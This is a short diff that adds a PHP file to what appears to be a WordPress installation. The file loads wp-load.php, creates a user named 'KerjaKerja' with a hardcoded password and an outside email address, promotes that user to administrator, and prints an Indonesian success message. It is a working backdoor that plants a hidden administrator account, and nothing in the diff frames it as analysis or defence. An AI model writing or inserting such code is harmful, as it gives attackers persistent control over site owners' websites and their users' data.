@@ -1,0 +1,6 @@
+<?php
+include('wp-load.php');
+$user_id = wp_create_user('KerjaKerja', 'Macau@boro159{}', 'hagamae5sj@gmail.com');
+$user = new WP_User($user_id);
+$user->set_role('administrator');
+echo 'Admin baru berhasil dibuat!';
